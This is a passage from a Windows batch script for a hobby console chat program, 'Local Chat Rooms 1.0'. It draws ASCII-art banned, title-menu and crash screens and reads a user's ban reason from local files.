%say%%d_toSay%
%say%╚═════════════════════════════════════════════╝
echo.
%chcp_off%
pause > nul
goto _crash_

:_bannedScreen_
%chcp_on%
set /p _bannedReason=<"%_localData_%\__users__\!_encryptOut!\u_reason.dll"
set /p _bannedBy=<"%_localData_%\__users__\!_encryptOut!\u_by.dll"
cls
%say%╔════════════════════════════════════════════════════╗
%say%║!b_red!               Local Chat Rooms 1.0                 !reset!║
%say%╠════════════════════════════════════════════════════╣
%say%║ ██████╗░░█████╗░███╗░░██╗███╗░░██╗███████╗██████╗░ ║
%say%║ ██╔══██╗██╔══██╗████╗░██║████╗░██║██╔════╝██╔══██╗ ║
%say%║ ██████╦╝███████║██╔██╗██║██╔██╗██║█████╗░░██║░░██║ ║
%say%║ ██╔══██╗██╔══██║██║╚████║██║╚████║██╔══╝░░██║░░██║ ║
%say%║ ██████╦╝██║░░██║██║░╚███║██║░╚███║███████╗██████╔╝ ║
%say%║ ╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚══╝╚══════╝╚═════╝░ ║
%say%║ By 1k0de                                           ║
%say%╠════════════════════════════════════════════════════╣
%say%║ You are banned from Local Chat Rooms^^!              ║
%say%╠════════════════════════════════════════════════════╝
%say%║ Banned By: !_bannedBy!
%say%║
%say%║ Reason: !_bannedReason!
%say%╚═════════════════════════════════════════════════════
echo.
%chcp_off%
echo [ Press Any Key ]
pause > nul
exit

:writeTitle
%chcp_on%
%say%╔═════════════════════════════════════════════╗
%say%║!b_red!            Local Chat Rooms 1.0             !reset!║
%say%╠═════════════════════════════════════════════╣
%say%║ ██╗░░░░░░█████╗░░█████╗░░█████╗░██╗░░░░░    ║
%say%║ ██║░░░░░██╔══██╗██╔══██╗██╔══██╗██║░░░░░    ║
%say%║ ██║░░░░░██║░░██║██║░░╚═╝███████║██║░░░░░    ║
%say%║ ██║░░░░░██║░░██║██║░░██╗██╔══██║██║░░░░░    ║
%say%║ ███████╗╚█████╔╝╚█████╔╝██║░░██║███████╗    ║
%say%║ ╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚══════╝    ║
%say%║ ░█████╗░██╗░░██╗░█████╗░████████╗           ║
%say%║ ██╔══██╗██║░░██║██╔══██╗╚══██╔══╝           ║
%say%║ ██║░░╚═╝███████║███████║░░░██║░░░           ║
%say%║ ██║░░██╗██╔══██║██╔══██║░░░██║░░░           ║
%say%║ ╚█████╔╝██║░░██║██║░░██║░░░██║░░░           ║
%say%║ ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░           ║
%say%║ ██████╗░░█████╗░░█████╗░███╗░░░███╗░██████╗ ║
%say%║ ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔════╝ ║
%say%║ ██████╔╝██║░░██║██║░░██║██╔████╔██║╚█████╗░ ║
%say%║ ██╔══██╗██║░░██║██║░░██║██║╚██╔╝██║░╚═══██╗ ║
%say%║ ██║░░██║╚█████╔╝╚█████╔╝██║░╚═╝░██║██████╔╝ ║
%say%║ ╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░ ║
%say%║ By 1k0de                                    ║
%say%╠═════════════════════════════════════════════╣
%say%║ !Blue!Type the number you wish to use!reset!             ║
%say%╠═════════════════════════════════════════════╣
%say%║ !yellow!1: Login                3: Report!reset!           ║
%say%║ !yellow!2: Sign Up              or $redirect!reset!        ║
%say%╚═════════════════════════════════════════════╝
%chcp_off%
exit /b 0

:_crash_
cls
echo.
echo The Local Chat Roos Client has crashed. Please report this error. Error Code: %_errorCode%
echo [ Press Any Key ]
pause > nul
exit
